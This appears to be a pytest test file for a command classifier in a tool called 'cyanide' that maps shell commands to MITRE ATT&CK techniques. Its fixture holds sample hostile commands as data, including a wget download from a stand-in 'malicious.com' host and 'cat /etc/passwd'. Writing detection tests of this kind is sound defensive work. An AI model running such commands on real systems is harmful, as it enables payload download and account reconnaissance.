from unittest.mock import MagicMock, patch

import pytest

from cyanide.ml.classifier import KnowledgeBase
from cyanide.ml.pipeline import CyanideML


@pytest.fixture
def kb():
    kb = KnowledgeBase()
    kb.command_corpus = ["ls", "wget http://malicious.com", "cat /etc/passwd"]
    kb.command_metadata = [
        {
            "technique_id": "T1059",
            "technique_name": "Command and Scripting Interpreter",
            "metadata": {},
        },
        {"technique_id": "T1105", "technique_name": "Ingress Tool Transfer", "metadata": {}},
        {"technique_id": "T1087", "technique_name": "Account Discovery", "metadata": {}},
    ]
    kb.technique_db = {
        "T1059": {"name": "Command and Scripting Interpreter", "tactics": ["Execution"]},
        "T1105": {"name": "Ingress Tool Transfer", "tactics": ["Command and Control"]},
        "T1087": {"name": "Account Discovery", "tactics": ["Discovery"]},
    }
    kb.build_index()
    return kb


def test_kb_build_index_and_search(kb):
    results = kb.search("wget", top_k=1)
    assert len(results) > 0
    assert results[0]["technique_id"] == "T1105"


def test_kb_classify_command(kb):
    res = kb.classify_command("wget malicious")
    assert res["classified"] is True
    assert res["technique"]["id"] == "T1105"


def test_kb_fallback_classify(kb):
    kb.is_built = False
    res = kb.classify_command("chmod 777")
    assert res.get("classified") is True
    assert res.get("match_method") == "keyword"


def test_kb_save_load(kb, tmp_path):
    path = tmp_path / "kb.pkl"
    kb.save(path)
    kb2 = KnowledgeBase()
    kb2.load(path)
    assert kb2.is_built is True
    assert len(kb2.command_corpus) == 3


@patch("cyanide.ml.pipeline.CommandAutoencoder")
@patch("cyanide.ml.pipeline.KnowledgeBase")
def test_cyanide_ml_analyze_command(mock_kb, mock_auto, kb):
    mock_auto.load.return_value = MagicMock()
    mock_auto.load.return_value.predict.return_value = (True, 0.9, 0.5)
    mock_auto.load.return_value.threshold = 0.5

    pipeline = CyanideML()
    pipeline.kb = kb
    pipeline.rule_engine = MagicMock()
    pipeline.rule_engine.evaluate.return_value = {
        "matched": True,
        "confidence": 0.8,
        "technique": "T1105",
        "description": "test rule",
        "severity": "HIGH",
    }
    pipeline.context_analyzer = MagicMock()
    pipeline.context_analyzer.analyze_url.return_value = {
        "verdict": "suspicious",
        "risk_score": 0.9,
    }
    pipeline.context_analyzer.analyze_file_paths.return_value = {
        "matched": True,
        "severity": "CRITICAL",
        "techniques": ["T1000"],
    }

    res = pipeline.analyze_command("wget http://test.com")
    assert res["is_anomaly"] is True
    assert res["verdict"] == "anomaly"
    assert res["classification"] is not None
